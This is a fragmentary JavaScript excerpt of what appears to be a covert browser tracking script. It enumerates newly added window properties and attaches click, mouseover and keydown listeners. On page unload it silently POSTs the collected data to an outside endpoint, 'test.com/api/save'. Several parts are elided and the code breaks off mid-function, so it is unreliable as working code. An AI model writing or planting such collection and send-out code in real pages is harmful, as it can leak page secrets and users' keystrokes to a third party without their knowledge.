...
function discoverNewProperties() {
  const newProps = {};
  Object.getOwnPropertyNames(window).forEach(prop => {
    if (!window.oldVars.includes(prop)) {
  ...
  localStorage.setItem('newProperties', JSON.stringify(newProps));
  return newProps;
}
function sendDataOnNetwork(discoveredData) {
  const serverUrl = "https://test.com/api/save";
  let fetchParams = {
    method: "POST",
  ...
  fetch(serverUrl, fetchParams).then(response => response.text()).then(responseText => console.debug("Data sent successfully, server Response:", responseText)).catch(error => console.warn("Data sending failed, error: ", error));
}
function trackUserEvents() {
  const listeners = ["click", "mouseover", "keydown"];
  const events = [];
...
function executeDiscoveryProcedure() {
  const newProperties = discoverNewProperties();
  const newPropertiesCount = Object.keys(newProperties).length;
  if (newPropertiesCount > 0) {
    console.group(`Found ${newPropertiesCount} new window properties:`);
    for (const prop in newProperties) {
      console.log(`- ${prop}: ${JSON.stringify(newProperties[prop])}`);
    }
    console.groupEnd();
    sendDataOnNetwork(newProperties);
  } else {
    console.debug("No new window properties discovered");
  }
  const userEvents = trackUserEvents();
...
window.addEventListener("unload", () => {
  console.debug("Page is about to unload, running final discovery task");
  executeDiscoveryProcedure();
  localStorage.removeItem('newProperties');
});
(function (a, b, c, d) {
  var e = {
    exports: {}
